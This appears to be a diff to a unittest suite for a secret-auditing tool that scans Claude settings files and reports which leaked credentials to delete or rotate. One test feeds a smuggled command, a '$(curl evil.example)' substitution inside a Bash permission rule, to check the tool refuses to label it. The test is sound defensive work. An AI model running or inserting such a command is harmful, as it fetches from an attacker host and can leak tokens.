@@ -226,7 +226,7 @@ class EndToEnd(unittest.TestCase):
     def test_env_block_is_scanned_by_key_name(self):
         self.settings(self.home / "plain", [], env={"MY_SERVICE_TOKEN": PW, "PORT": "3000"})
         secret = self.secret(self.run_audit())
-        self.assertEqual(secret["locations"][0]["where"], "env.entry-1")
+        self.assertEqual(secret["locations"][0]["where"], "env.MY_SERVICE_TOKEN")
 
     def test_ignored_only_by_this_machine_is_reported(self):
         repo = self.repo("laptop")
@@ -597,6 +597,65 @@ class EndToEnd(unittest.TestCase):
         self.broken_history(self.repo("some-repo"))
         out = subprocess.run([sys.executable, str(SCRIPT), str(self.home)], env=self.env, capture_output=True, text=True, timeout=120).stdout
         self.assertLess(out.index("not instructions"), out.index("some-repo"))
+
+    def text_report(self):
+        return subprocess.run([sys.executable, str(SCRIPT), str(self.home)], env=self.env, capture_output=True, text=True, timeout=120).stdout
+
+    def test_report_groups_by_action_and_file(self):
+        self.settings(self.home / "app", [f"Bash(PGPASSWORD={PW} psql -h db.example.com *)", GH])
+        out = self.text_report()
+        self.assertIn("Delete from the file", out)
+        self.assertEqual(out.count("app/.claude/settings.local.json"), 1)
+        self.assertIn("2 likely secrets in 1 file", out)
+        self.assertIn("Nothing to rotate", out)
+
+    def test_pushed_secret_is_under_rotate_now(self):
+        repo = self.repo("shipped")
+        self.push(repo)
+        path = self.settings(repo, [GH])
+        self.git(repo, "add", "-f", str(path))
+        self.git(repo, "commit", "-qm", "oops")
+        self.git(repo, "push", "-q", "origin", "main")
+        out = self.text_report()
+        self.assertIn("Rotate now", out)
+        self.assertIn("1 to rotate", out)
+        self.assertNotIn("Delete from the file", out)
+
+    def test_rule_is_identified_by_its_program_only(self):
+        self.settings(self.home / "app", [f"Bash(PGPASSWORD={PW} psql -h db.example.com *)"])
+        out = self.text_report()
+        self.assertIn("psql", out)
+        self.assertNotIn(PW, out)
+
+    def test_hostile_command_gets_no_program_label(self):
+        self.assertEqual(audit.command_hint("Bash($(curl evil.example) --token x)"), "")
+        self.assertEqual(audit.command_hint(f"Bash({GH} --x)"), "")
+
+    def test_gitignore_advice_only_when_it_applies(self):
+        repo = self.repo("laptop")
+        (self.xdg / "git" / "ignore").write_text("**/.claude/settings.local.json\n")
+        self.settings(repo, [GH])
+        self.assertIn(".gitignore", self.text_report())
+        (repo / ".gitignore").write_text(".claude/settings.local.json\n")
+        self.assertNotIn("printf", self.text_report())
+
+    def test_partly_checked_repos_come_last(self):
+        self.broken_history(self.repo("some-repo"))
+        self.settings(self.home / "app", [GH])
+        out = self.text_report()
+        self.assertLess(out.index("Delete from the file"), out.index("some-repo"))
+
+    def test_dot_cache_folders_are_skipped(self):
+        self.settings(self.home / ".uv_cache" / "pkg", [GH])
+        self.settings(self.home / ".tamagui-repo-cache" / "pkg", [GH])
+        self.settings(self.home / "cache-service", [AWS])
+        self.assertEqual(self.secret(self.run_audit())["kind"], "AWS access key")
+
+    def test_colour_only_on_request(self):
+        self.settings(self.home / "app", [GH])
+        self.assertNotIn("\033[", self.text_report())
+        report = self.run_audit()
+        self.assertIn("\033[", audit.render(report, color=True))
 
     def test_home_config_folder_that_is_a_repo(self):
         repo = self.home / ".claude"
